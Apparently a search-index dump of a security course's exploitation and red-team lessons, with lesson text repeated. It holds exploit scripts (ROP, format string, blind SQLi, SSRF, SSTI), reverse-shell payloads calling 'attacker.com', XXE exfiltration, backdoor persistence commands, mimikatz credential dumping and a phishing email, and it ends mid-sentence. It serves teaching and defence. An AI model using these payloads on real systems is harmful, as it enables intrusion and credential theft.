ret 0x00401234: pop rdi 0x00401235: ret ; Gadget 2: pop rsi; ret 0x00401240: pop rsi 0x00401241: ret ; Gadget 3: syscall; ret 0x00401250: syscall 0x00401251: ret ROP chain to call execve(\"/bin/sh\", NULL, NULL): import struct def p64(addr): return struct.pack(\"<Q\", addr) # Build ROP chain rop_chain = b\"\" rop_chain += p64(0x00401234) # pop rdi; ret rop_chain += p64(0x00601234) # address of \"/bin/sh\" rop_chain += p64(0x00401240) # pop rsi; ret rop_chain += p64(0x0) # NULL rop_chain += p64(0x00401245) # pop rdx; ret rop_chain += p64(0x0) # NULL rop_chain += p64(0x00401250) # syscall; ret payload = b\"A\" * 72 + rop_chain Finding gadgets: # Using ROPgadget ROPgadget --binary vulnerable_binary # Using ropper ropper --file vulnerable_binary --search \"pop rdi\" Heap Exploitation Heap overflow: Overwrite heap metadata to control allocations. Use-after-free: Access memory after it's been freed. // Use-after-free vulnerability #include <stdlib.h> #include <string.h> struct object { void (*function_pointer)(void); char data[64]; }; void legitimate_function() { printf(\"Normal operation\\n\"); } void evil_function() { printf(\"Compromised!\\n\"); // Execute shellcode } int main() { struct object *obj = malloc(sizeof(struct object)); obj->function_pointer = legitimate_function; strcpy(obj->data, \"Some data\"); // Use object obj->function_pointer(); // Free object free(obj); // VULNERABILITY: Still have pointer to freed memory // Attacker can allocate new memory in same location // and control function_pointer // Later use (after free) obj->function_pointer(); // Now calls attacker-controlled address return 0; } Exploitation: 1. Trigger use-after-free 2. Allocate new object in freed location 3. Control function pointer 4. Trigger function call Format String Vulnerabilities Occurs when user input is used as format string. Vulnerable code: #include <stdio.h> void vulnerable(char *input) { printf(input); // VULNERABLE! } // Should be: // printf(\"%s\", input); Exploitation capabilities: Read memory: # %x reads from stack ./vulnerable \"%x %x %x %x\" # %s reads string from address ./vulnerable \"%s\" # Direct parameter access ./vulnerable \"%10$x\" # Reads 10th parameter Write memory: # %n writes number of bytes printed so far ./vulnerable \"AAAA%n\" # Writes 4 to address AAAA # Write arbitrary value ./vulnerable \"%100x%n\" # Writes 100 # Write to specific address ./vulnerable \"\\x04\\x03\\x02\\x01%10$n\" Exploitation example: #!/usr/bin/env python3 import struct def p32(addr): return struct.pack(\"<I\", addr) # Target: overwrite GOT entry for printf got_printf = 0x08049a30 shellcode_addr = 0xbffff700 # Calculate values to write value_to_write = shellcode_addr # Build exploit exploit = b\"\" exploit += p32(got_printf) # Address to write to exploit += p32(got_printf + 1) # Write to each byte exploit += p32(got_printf + 2) exploit += p32(got_printf + 3) # Use %n to write values exploit += b\"%12$n\" # Write to first address # ... (calculate proper widths for each byte) print(exploit) SQL Injection - Advanced Second-Order SQL Injection Data is stored, then later used in SQL query. Example: # First request - store malicious data username = \"admin'--\" db.execute(\"INSERT INTO users (username) VALUES (?)\", (username,)) # Second request - vulnerable query uses stored data stored_username = db.execute(\"SELECT username FROM users WHERE id=1\").fetchone()[0] # stored_username is now \"admin'--\" # VULNERABLE: Uses stored data without sanitization results = db.execute(f\"SELECT * FROM posts WHERE author='{stored_username}'\") # Becomes: SELECT * FROM posts WHERE author='admin'--' Prevention: Sanitize data on output, not just input. Blind SQL Injection No direct output, must infer results. Time-based blind SQLi: -- If condition true, delay 5 seconds ' OR IF(1=1, SLEEP(5), 0)-- -- Extract database name character by character ' OR IF(SUBSTRING(DATABASE(),1,1)='a', SLEEP(5), 0)-- ' OR IF(SUBSTRING(DATABASE(),1,1)='b', SLEEP(5), 0)-- -- ... continue for each character Boolean-based blind SQLi: -- Test if condition is true ' AND 1=1-- (page loads normally) ' AND 1=2-- (page different or error) -- Extract data bit by bit ' AND ASCII(SUBSTRING(DATABASE(),1,1))>97-- ' AND ASCII(SUBSTRING(DATABASE(),1,1))>109-- -- Binary search to find exact value Automated extraction: import requests import time def extract_database_name(url): db_name = \"\" position = 1 while True: found_char = False # Try each character for ascii_val in range(32, 127): payload = f\"' AND ASCII(SUBSTRING(DATABASE(),{position},1))={ascii_val}--\" start = time.time() response = requests.get(url, params={'id': payload}) duration = time.time() - start # If response delayed, character is correct if duration > 5: db_name += chr(ascii_val) position += 1 found_char = True print(f\"Found: {db_name}\") break if not found_char: break return db_name # Usage db = extract_database_name(\"http://example.com/page.php\") print(f\"Database name: {db}\") NoSQL Injection Targets MongoDB, CouchDB, etc. Example (MongoDB): // Vulnerable query db.users.find({ username: req.body.username, password: req.body.password }) // Attack payload username[$ne]=null&password[$ne]=null // Becomes: Find where username != null AND password != null // Returns all users! More examples: // Bypass authentication {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}} // Extract data {\"username\": {\"$regex\": \"^admin\"}} // Starts with \"admin\" {\"username\": {\"$regex\": \"^a\"}} // Starts with \"a\" // JavaScript injection (if allowed) {\"$where\": \"this.username == 'admin' || '1'=='1'\"} Prevention: // Cast to string username: String(req.body.username) // Validate type if (typeof req.body.username !== 'string') { return res.status(400).send('Invalid input'); } // Use parameterized queries db.users.findOne({ username: { $eq: req.body.username }, password: { $eq: req.body.password } }) Deserialization Attacks Exploits insecure deserialization of objects. Python Pickle RCE import pickle import os # Malicious class class Exploit: def __reduce__(self): # This executes when unpickled return (os.system, ('nc attacker.com 4444 -e /bin/sh',)) # Serialize malicious object evil_data = pickle.dumps(Exploit()) # Victim deserializes pickle.loads(evil_data) # EXECUTES COMMAND! Java Deserialization Apache Commons Collections vulnerability: // Vulnerable code ObjectInputStream ois = new ObjectInputStream(input); Object obj = ois.readObject(); // DANGEROUS! Exploitation using ysoserial: # Generate payload java -jar ysoserial.jar CommonsCollections1 'nc attacker.com 4444 -e /bin/sh' | base64 # Send to vulnerable endpoint curl -X POST http://victim.com/api -d @payload PHP Unserialize <?php // Vulnerable code $user = unserialize($_COOKIE['user']); // Malicious serialized object class Evil { private $command; function __wakeup() { system($this->command); } } $evil = new Evil(); $evil->command = \"nc attacker.com 4444 -e /bin/sh\"; echo serialize($evil); ?> Prevention: - Never deserialize untrusted data - Use JSON instead of native serialization - Implement integrity checks (HMAC) - Whitelist allowed classes Server-Side Request Forgery (SSRF) Trick server into making requests to internal resources. Basic SSRF # Vulnerable code import requests @app.route('/fetch') def fetch_url(): url = request.args.get('url') response = requests.get(url) return response.content Exploitation: # Access internal services http://victim.com/fetch?url=http://localhost:6379/ # Access Redis http://victim.com/fetch?url=http://169.254.169.254/latest/meta-data/ # Access AWS metadata http://victim.com/fetch?url=http://internal-server/admin # Access internal admin panel http://victim.com/fetch?url=file:///etc/passwd # Read local files Advanced SSRF Bypass filters: # URL encoding http://victim.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/ # Alternative representations http://victim.com/fetch?url=http://127.1/ http://victim.com/fetch?url=http://0x7f000001/ # DNS rebinding http://victim.com/fetch?url=http://attacker-controlled-domain/ # Domain resolves to internal IP # Protocol smuggling http://victim.com/fetch?url=gopher://internal-server:6379/_FLUSHALL # Use gopher to send arbitrary data Exploitation script: #!/usr/bin/env python3 import requests def ssrf_exploit(target_url, internal_url): \"\"\"Exploit SSRF to access internal resource\"\"\" # Various bypass techniques payloads = [ internal_url, internal_url.replace('127.0.0.1', 'localhost'), internal_url.replace('127.0.0.1', '127.1'), internal_url.replace('http://', 'http://127.0.0.1@'), f\"http://attacker.com@{internal_url.split('//')[1]}\", ] for payload in payloads: try: response = requests.get( target_url, params={'url': payload}, timeout=5 ) if response.status_code == 200: print(f\"[+] Success with: {payload}\") print(response.text[:500]) return response.text except: continue print(\"[-] All payloads failed\") return None # Exploit cloud metadata ssrf_exploit( 'http://victim.com/fetch', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' ) Template Injection Server-Side Template Injection (SSTI) Vulnerable code (Jinja2/Python): from flask import Flask, request, render_template_string @app.route('/hello') def hello(): name = request.args.get('name') template = f\"Hello {name}!\" # VULNERABLE! return render_template_string(template) Detection: # Test for injection http://victim.com/hello?name={{7*7}} # If output is \"49\", vulnerable! # Identify template engine {{7*'7'}} # Jinja2: 7777777 ${7*7} # Freemarker: 49 <%= 7*7 %> # ERB: 49 Exploitation (Jinja2): # Read files {{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read() }} # Execute commands {{ config.__class__.__init__.__globals__['os'].popen('nc attacker.com 4444 -e /bin/sh').read() }} # More compact {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {{ c.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }} {% endif %} {% endfor %} Exploitation tool: #!/usr/bin/env python3 import requests def ssti_exploit(url, param): \"\"\"Exploit SSTI vulnerability\"\"\" # Test if vulnerable test_payload = \"{{7*7}}\" response = requests.get(url, params={param: test_payload}) if \"49\" in response.text: print(\"[+] SSTI vulnerability confirmed!\") # RCE payload for Jinja2 rce_payload = \"{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}\" response = requests.get(url, params={param: rce_payload}) print(f\"[+] Command output:\\n{response.text}\") else: print(\"[-] Not vulnerable or different template engine\") # Usage ssti_exploit('http://victim.com/hello', 'name') XML External Entity (XXE) Injection Exploits XML parsers that process external entities. Vulnerable code: <?php $xml = file_get_contents('php://input'); $doc = new DOMDocument(); $doc->loadXML($xml, LIBXML_NOENT); // VULNERABLE! ?> Basic XXE - Read files: <?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <root> <data>&xxe;</data> </root> Blind XXE - Out-of-band: <?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd; %send; ]> <root></root> evil.dtd on attacker server: <!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>\"> %all; XXE to SSRF: <?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://internal-server:8080/admin\"> ]> <root> <data>&xxe;</data> </root> Prevention: # Python from defusedxml import ElementTree tree = ElementTree.parse(xml_file) # PHP libxml_disable_entity_loader(true); # Java factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); Key Takeaways Modern exploitation requires: - Deep understanding of memory layout - Knowledge of protection bypasses - Creative chaining of vulnerabilities - Patience and persistence Common patterns: - Information disclosure \u2192 Exploit development - Authentication bypass \u2192 Privilege escalation - SSRF \u2192 Internal network access - Deserialization \u2192 Remote code execution Defense strategies: - Input validation everywhere - Principle of least privilege - Defense in depth - Regular security audits - Bug bounty programs Remember: - These techniques are for authorized testing only - Always have written permission - Document everything - Report responsibly - Continuous learning is essential Advanced exploitation is constantly evolving. Stay current with new techniques, study real-world exploits, and practice in legal environments like HackTheBox, TryHackMe, and bug bounty programs.","title":"Lesson 9.2"},{"location":"LECTURES/unit9/lesson9-2/#advanced-exploitation-techniques","text":"Beyond basic attacks, sophisticated threat actors use advanced exploitation techniques to compromise systems, evade detection, and maintain persistence. This lesson explores modern exploitation methods used in real-world attacks.","title":"Advanced Exploitation Techniques"},{"location":"LECTURES/unit9/lesson9-2/#memory-corruption-exploits","text":"","title":"Memory Corruption Exploits"},{"location":"LECTURES/unit9/lesson9-2/#buffer-overflows","text":"How it works: Program writes data beyond buffer boundary, overwriting adjacent memory. Stack buffer overflow example: #include <stdio.h> #include <string.h> void vulnerable_function(char *input) { char buffer[64]; strcpy(buffer, input); // No bounds checking! printf(\"Input: %s\\n\", buffer); } int main(int argc, char *argv[]) { if (argc > 1) { vulnerable_function(argv[1]); } return 0; } Exploitation: import struct # Create payload buffer_size = 64 padding = b\"A\" * buffer_size # Overwrite saved EIP (return address) # This is the address we want to jump to new_eip = struct.pack(\"<I\", 0x08048484) # Address of shellcode # Add shellcode (or ROP chain) shellcode = b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68...\" payload = padding + new_eip + shellcode print(payload) Modern protections: - ASLR (Address Space Layout Randomization) : Randomizes memory locations - DEP/NX (Data Execution Prevention) : Marks stack as non-executable - Stack canaries : Detects buffer overflow before return - RELRO : Makes GOT read-only","title":"Buffer Overflows"},{"location":"LECTURES/unit9/lesson9-2/#return-oriented-programming-rop","text":"Bypasses DEP/NX by reusing existing code. How it works: - Find \"gadgets\" (instruction sequences ending in ret ) - Chain gadgets together - Execute existing code in new order Example gadgets: ; Gadget 1: pop rdi; ret 0x00401234: pop rdi 0x00401235: ret ; Gadget 2: pop rsi; ret 0x00401240: pop rsi 0x00401241: ret ; Gadget 3: syscall; ret 0x00401250: syscall 0x00401251: ret ROP chain to call execve(\"/bin/sh\", NULL, NULL): import struct def p64(addr): return struct.pack(\"<Q\", addr) # Build ROP chain rop_chain = b\"\" rop_chain += p64(0x00401234) # pop rdi; ret rop_chain += p64(0x00601234) # address of \"/bin/sh\" rop_chain += p64(0x00401240) # pop rsi; ret rop_chain += p64(0x0) # NULL rop_chain += p64(0x00401245) # pop rdx; ret rop_chain += p64(0x0) # NULL rop_chain += p64(0x00401250) # syscall; ret payload = b\"A\" * 72 + rop_chain Finding gadgets: # Using ROPgadget ROPgadget --binary vulnerable_binary # Using ropper ropper --file vulnerable_binary --search \"pop rdi\"","title":"Return-Oriented Programming (ROP)"},{"location":"LECTURES/unit9/lesson9-2/#heap-exploitation","text":"Heap overflow: Overwrite heap metadata to control allocations. Use-after-free: Access memory after it's been freed. // Use-after-free vulnerability #include <stdlib.h> #include <string.h> struct object { void (*function_pointer)(void); char data[64]; }; void legitimate_function() { printf(\"Normal operation\\n\"); } void evil_function() { printf(\"Compromised!\\n\"); // Execute shellcode } int main() { struct object *obj = malloc(sizeof(struct object)); obj->function_pointer = legitimate_function; strcpy(obj->data, \"Some data\"); // Use object obj->function_pointer(); // Free object free(obj); // VULNERABILITY: Still have pointer to freed memory // Attacker can allocate new memory in same location // and control function_pointer // Later use (after free) obj->function_pointer(); // Now calls attacker-controlled address return 0; } Exploitation: 1. Trigger use-after-free 2. Allocate new object in freed location 3. Control function pointer 4. Trigger function call","title":"Heap Exploitation"},{"location":"LECTURES/unit9/lesson9-2/#format-string-vulnerabilities","text":"Occurs when user input is used as format string. Vulnerable code: #include <stdio.h> void vulnerable(char *input) { printf(input); // VULNERABLE! } // Should be: // printf(\"%s\", input); Exploitation capabilities: Read memory: # %x reads from stack ./vulnerable \"%x %x %x %x\" # %s reads string from address ./vulnerable \"%s\" # Direct parameter access ./vulnerable \"%10$x\" # Reads 10th parameter Write memory: # %n writes number of bytes printed so far ./vulnerable \"AAAA%n\" # Writes 4 to address AAAA # Write arbitrary value ./vulnerable \"%100x%n\" # Writes 100 # Write to specific address ./vulnerable \"\\x04\\x03\\x02\\x01%10$n\" Exploitation example: #!/usr/bin/env python3 import struct def p32(addr): return struct.pack(\"<I\", addr) # Target: overwrite GOT entry for printf got_printf = 0x08049a30 shellcode_addr = 0xbffff700 # Calculate values to write value_to_write = shellcode_addr # Build exploit exploit = b\"\" exploit += p32(got_printf) # Address to write to exploit += p32(got_printf + 1) # Write to each byte exploit += p32(got_printf + 2) exploit += p32(got_printf + 3) # Use %n to write values exploit += b\"%12$n\" # Write to first address # ... (calculate proper widths for each byte) print(exploit)","title":"Format String Vulnerabilities"},{"location":"LECTURES/unit9/lesson9-2/#sql-injection-advanced","text":"","title":"SQL Injection - Advanced"},{"location":"LECTURES/unit9/lesson9-2/#second-order-sql-injection","text":"Data is stored, then later used in SQL query. Example: # First request - store malicious data username = \"admin'--\" db.execute(\"INSERT INTO users (username) VALUES (?)\", (username,)) # Second request - vulnerable query uses stored data stored_username = db.execute(\"SELECT username FROM users WHERE id=1\").fetchone()[0] # stored_username is now \"admin'--\" # VULNERABLE: Uses stored data without sanitization results = db.execute(f\"SELECT * FROM posts WHERE author='{stored_username}'\") # Becomes: SELECT * FROM posts WHERE author='admin'--' Prevention: Sanitize data on output, not just input.","title":"Second-Order SQL Injection"},{"location":"LECTURES/unit9/lesson9-2/#blind-sql-injection","text":"No direct output, must infer results. Time-based blind SQLi: -- If condition true, delay 5 seconds ' OR IF(1=1, SLEEP(5), 0)-- -- Extract database name character by character ' OR IF(SUBSTRING(DATABASE(),1,1)='a', SLEEP(5), 0)-- ' OR IF(SUBSTRING(DATABASE(),1,1)='b', SLEEP(5), 0)-- -- ... continue for each character Boolean-based blind SQLi: -- Test if condition is true ' AND 1=1-- (page loads normally) ' AND 1=2-- (page different or error) -- Extract data bit by bit ' AND ASCII(SUBSTRING(DATABASE(),1,1))>97-- ' AND ASCII(SUBSTRING(DATABASE(),1,1))>109-- -- Binary search to find exact value Automated extraction: import requests import time def extract_database_name(url): db_name = \"\" position = 1 while True: found_char = False # Try each character for ascii_val in range(32, 127): payload = f\"' AND ASCII(SUBSTRING(DATABASE(),{position},1))={ascii_val}--\" start = time.time() response = requests.get(url, params={'id': payload}) duration = time.time() - start # If response delayed, character is correct if duration > 5: db_name += chr(ascii_val) position += 1 found_char = True print(f\"Found: {db_name}\") break if not found_char: break return db_name # Usage db = extract_database_name(\"http://example.com/page.php\") print(f\"Database name: {db}\")","title":"Blind SQL Injection"},{"location":"LECTURES/unit9/lesson9-2/#nosql-injection","text":"Targets MongoDB, CouchDB, etc. Example (MongoDB): // Vulnerable query db.users.find({ username: req.body.username, password: req.body.password }) // Attack payload username[$ne]=null&password[$ne]=null // Becomes: Find where username != null AND password != null // Returns all users! More examples: // Bypass authentication {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}} // Extract data {\"username\": {\"$regex\": \"^admin\"}} // Starts with \"admin\" {\"username\": {\"$regex\": \"^a\"}} // Starts with \"a\" // JavaScript injection (if allowed) {\"$where\": \"this.username == 'admin' || '1'=='1'\"} Prevention: // Cast to string username: String(req.body.username) // Validate type if (typeof req.body.username !== 'string') { return res.status(400).send('Invalid input'); } // Use parameterized queries db.users.findOne({ username: { $eq: req.body.username }, password: { $eq: req.body.password } })","title":"NoSQL Injection"},{"location":"LECTURES/unit9/lesson9-2/#deserialization-attacks","text":"Exploits insecure deserialization of objects.","title":"Deserialization Attacks"},{"location":"LECTURES/unit9/lesson9-2/#python-pickle-rce","text":"import pickle import os # Malicious class class Exploit: def __reduce__(self): # This executes when unpickled return (os.system, ('nc attacker.com 4444 -e /bin/sh',)) # Serialize malicious object evil_data = pickle.dumps(Exploit()) # Victim deserializes pickle.loads(evil_data) # EXECUTES COMMAND!","title":"Python Pickle RCE"},{"location":"LECTURES/unit9/lesson9-2/#java-deserialization","text":"Apache Commons Collections vulnerability: // Vulnerable code ObjectInputStream ois = new ObjectInputStream(input); Object obj = ois.readObject(); // DANGEROUS! Exploitation using ysoserial: # Generate payload java -jar ysoserial.jar CommonsCollections1 'nc attacker.com 4444 -e /bin/sh' | base64 # Send to vulnerable endpoint curl -X POST http://victim.com/api -d @payload","title":"Java Deserialization"},{"location":"LECTURES/unit9/lesson9-2/#php-unserialize","text":"<?php // Vulnerable code $user = unserialize($_COOKIE['user']); // Malicious serialized object class Evil { private $command; function __wakeup() { system($this->command); } } $evil = new Evil(); $evil->command = \"nc attacker.com 4444 -e /bin/sh\"; echo serialize($evil); ?> Prevention: - Never deserialize untrusted data - Use JSON instead of native serialization - Implement integrity checks (HMAC) - Whitelist allowed classes","title":"PHP Unserialize"},{"location":"LECTURES/unit9/lesson9-2/#server-side-request-forgery-ssrf","text":"Trick server into making requests to internal resources.","title":"Server-Side Request Forgery (SSRF)"},{"location":"LECTURES/unit9/lesson9-2/#basic-ssrf","text":"# Vulnerable code import requests @app.route('/fetch') def fetch_url(): url = request.args.get('url') response = requests.get(url) return response.content Exploitation: # Access internal services http://victim.com/fetch?url=http://localhost:6379/ # Access Redis http://victim.com/fetch?url=http://169.254.169.254/latest/meta-data/ # Access AWS metadata http://victim.com/fetch?url=http://internal-server/admin # Access internal admin panel http://victim.com/fetch?url=file:///etc/passwd # Read local files","title":"Basic SSRF"},{"location":"LECTURES/unit9/lesson9-2/#advanced-ssrf","text":"Bypass filters: # URL encoding http://victim.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/ # Alternative representations http://victim.com/fetch?url=http://127.1/ http://victim.com/fetch?url=http://0x7f000001/ # DNS rebinding http://victim.com/fetch?url=http://attacker-controlled-domain/ # Domain resolves to internal IP # Protocol smuggling http://victim.com/fetch?url=gopher://internal-server:6379/_FLUSHALL # Use gopher to send arbitrary data Exploitation script: #!/usr/bin/env python3 import requests def ssrf_exploit(target_url, internal_url): \"\"\"Exploit SSRF to access internal resource\"\"\" # Various bypass techniques payloads = [ internal_url, internal_url.replace('127.0.0.1', 'localhost'), internal_url.replace('127.0.0.1', '127.1'), internal_url.replace('http://', 'http://127.0.0.1@'), f\"http://attacker.com@{internal_url.split('//')[1]}\", ] for payload in payloads: try: response = requests.get( target_url, params={'url': payload}, timeout=5 ) if response.status_code == 200: print(f\"[+] Success with: {payload}\") print(response.text[:500]) return response.text except: continue print(\"[-] All payloads failed\") return None # Exploit cloud metadata ssrf_exploit( 'http://victim.com/fetch', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' )","title":"Advanced SSRF"},{"location":"LECTURES/unit9/lesson9-2/#template-injection","text":"Server-Side Template Injection (SSTI) Vulnerable code (Jinja2/Python): from flask import Flask, request, render_template_string @app.route('/hello') def hello(): name = request.args.get('name') template = f\"Hello {name}!\" # VULNERABLE! return render_template_string(template) Detection: # Test for injection http://victim.com/hello?name={{7*7}} # If output is \"49\", vulnerable! # Identify template engine {{7*'7'}} # Jinja2: 7777777 ${7*7} # Freemarker: 49 <%= 7*7 %> # ERB: 49 Exploitation (Jinja2): # Read files {{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read() }} # Execute commands {{ config.__class__.__init__.__globals__['os'].popen('nc attacker.com 4444 -e /bin/sh').read() }} # More compact {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {{ c.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }} {% endif %} {% endfor %} Exploitation tool: #!/usr/bin/env python3 import requests def ssti_exploit(url, param): \"\"\"Exploit SSTI vulnerability\"\"\" # Test if vulnerable test_payload = \"{{7*7}}\" response = requests.get(url, params={param: test_payload}) if \"49\" in response.text: print(\"[+] SSTI vulnerability confirmed!\") # RCE payload for Jinja2 rce_payload = \"{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}\" response = requests.get(url, params={param: rce_payload}) print(f\"[+] Command output:\\n{response.text}\") else: print(\"[-] Not vulnerable or different template engine\") # Usage ssti_exploit('http://victim.com/hello', 'name')","title":"Template Injection"},{"location":"LECTURES/unit9/lesson9-2/#xml-external-entity-xxe-injection","text":"Exploits XML parsers that process external entities. Vulnerable code: <?php $xml = file_get_contents('php://input'); $doc = new DOMDocument(); $doc->loadXML($xml, LIBXML_NOENT); // VULNERABLE! ?> Basic XXE - Read files: <?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <root> <data>&xxe;</data> </root> Blind XXE - Out-of-band: <?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd; %send; ]> <root></root> evil.dtd on attacker server: <!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>\"> %all; XXE to SSRF: <?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://internal-server:8080/admin\"> ]> <root> <data>&xxe;</data> </root> Prevention: # Python from defusedxml import ElementTree tree = ElementTree.parse(xml_file) # PHP libxml_disable_entity_loader(true); # Java factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);","title":"XML External Entity (XXE) Injection"},{"location":"LECTURES/unit9/lesson9-2/#key-takeaways","text":"Modern exploitation requires: - Deep understanding of memory layout - Knowledge of protection bypasses - Creative chaining of vulnerabilities - Patience and persistence Common patterns: - Information disclosure \u2192 Exploit development - Authentication bypass \u2192 Privilege escalation - SSRF \u2192 Internal network access - Deserialization \u2192 Remote code execution Defense strategies: - Input validation everywhere - Principle of least privilege - Defense in depth - Regular security audits - Bug bounty programs Remember: - These techniques are for authorized testing only - Always have written permission - Document everything - Report responsibly - Continuous learning is essential Advanced exploitation is constantly evolving. Stay current with new techniques, study real-world exploits, and practice in legal environments like HackTheBox, TryHackMe, and bug bounty programs.","title":"Key Takeaways"},{"location":"LECTURES/unit9/lesson9-3/","text":"APT Tactics and Red Team Operations Advanced Persistent Threats (APTs) and sophisticated red teams use tactics far beyond simple exploits. This lesson explores the methodologies, techniques, and tools used in advanced offensive operations. The Kill Chain Lockheed Martin Cyber Kill Chain 7 stages of attack: Reconnaissance - Research target Weaponization - Create malicious payload Delivery - Transmit weapon to target Exploitation - Trigger vulnerability Installation - Install backdoor Command & Control (C2) - Establish communication Actions on Objectives - Achieve goal Defensive value: Break the chain at any point to stop attack. MITRE ATT&CK Framework Structured knowledge base of tactics and techniques. 14 Tactics: 1. Reconnaissance 2. Resource Development 3. Initial Access 4. Execution 5. Persistence 6. Privilege Escalation 7. Defense Evasion 8. Credential Access 9. Discovery 10. Lateral Movement 11. Collection 12. Command and Control 13. Exfiltration 14. Impact Each tactic contains multiple techniques and sub-techniques. Example - Persistence Techniques: - Boot or Logon Autostart Execution - Create Account - Scheduled Task/Job - Valid Accounts - Browser Extensions - Office Application Startup Initial Access Spear Phishing Targeted phishing against specific individuals. Components of successful spear phishing: - Reconnaissance (social media, LinkedIn, company site) - Personalization (reference specific projects, people) - Context (timing matters - before deadlines, holidays) - Credible sender (compromised account or spoofing) - Compelling action (urgency, authority, curiosity) Example email: From: IT Support <itsupport@company.com> To: john.smith@company.com Subject: URGENT: Password Reset Required - Security Alert Hi John, We've detected suspicious login attempts on your account from an IP address in Russia. For your security, please reset your password immediately using this secure link: https://company-password-reset.com/reset?token=abc123 This link expires in 2 hours. If you don't reset your password, your account will be locked. Thank you, IT Security Team Red flags defenders should catch: - Domain typosquatting (company vs company) - Unusual urgency - External link for password reset - Grammar/spelling errors - Sender address doesn't match display name Watering Hole Attacks Compromise websites target visits. Process: 1. Identify target organization 2. Research where employees browse 3. Compromise those websites 4. Inject malware/exploit 5. Wait for target to visit Example: - Target: Defense contractor employees - Watering hole: Industry news site they all read - Payload: Browser exploit or malicious download Supply Chain Attacks Compromise vendors to reach ultimate target. Types: - Software supply chain (malicious updates) - Hardware supply chain (backdoored components) - Service provider compromise (access to multiple clients) Famous examples: - SolarWinds (Orion platform compromise) - CCleaner (malicious update) - ASUS Live Update (backdoored software) Persistence Mechanisms Registry Run Keys (Windows) # Current user reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\malware.exe\" # All users (requires admin) reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\malware.exe\" Scheduled Tasks # Create scheduled task schtasks /create /tn \"Windows Update\" /tr \"C:\\malware.exe\" /sc onlogon /ru SYSTEM # Or with XML for more control schtasks /create /tn \"Update\" /xml task.xml Service Installation # Create malicious service sc create \"WindowsUpdater\" binPath= \"C:\\malware.exe\" start= auto # Start service sc start \"WindowsUpdater\" WMI Event Subscription Fileless persistence: # Create event filter (trigger) $Filter = Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{ Name = \"UpdateFilter\" EventNamespace = \"root\\cimv2\" QueryLanguage = \"WQL\" Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" } # Create consumer (action) $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{ Name = \"UpdateConsumer\" CommandLineTemplate = \"powershell.exe -enc <base64_payload>\" } # Bind filter to consumer Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\\subscription\" -Arguments @{ Filter = $Filter Consumer = $Consumer } Linux Persistence Cron jobs: # User crontab echo \"@reboot /tmp/.hidden/backdoor.sh\" | crontab - # System-wide echo \"@reboot root /tmp/.hidden/backdoor.sh\" >> /etc/crontab Systemd service: # Create service file cat > /etc/systemd/system/update.service << EOF [Unit] Description=System Update Service [Service] Type=simple ExecStart=/tmp/.hidden/backdoor.sh Restart=always [Install] WantedBy=multi-user.target EOF # Enable and start systemctl enable update.service systemctl start update.service SSH keys: # Add attacker's public key mkdir -p ~/.ssh echo \"ssh-rsa AAAA...\" >> ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys Credential Access Credential Dumping Mimikatz (Windows): # Dump passwords from LSASS mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" # Dump cached credentials mimikatz.exe \"lsadump::cache\" \"exit\" # Dump SAM database mimikatz.exe \"lsadump::sam\" \"exit\" # Export tickets for pass-the-ticket mimikatz.exe \"sekurlsa::tickets /export\" \"exit\" Dumping /etc/shadow (Linux): # Read shadow file (requires root) cat /etc/shadow # Unshadow for cracking unshadow /etc/passwd /etc/shadow > hashes.txt john hashes.txt Pass-the-Hash Use NTLM hash without cracking password. # Using pth-toolkit pth-winexe -U domain/user%hash //target cmd.exe # Using Impacket psexec.py -hashes :ntlm_hash user@target # Using CrackMapExec crackmapexec smb target -u user -H ntlm_hash Kerberoasting Extract and crack service account passwords. # Request service tickets Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/server.domain.com\" # Export tickets Invoke-Mimikatz -Command '\"kerberos::list /export\"' # Offline cracking hashcat -m 13100 ticket.kirbi wordlist.txt Golden Ticket Attack Forge 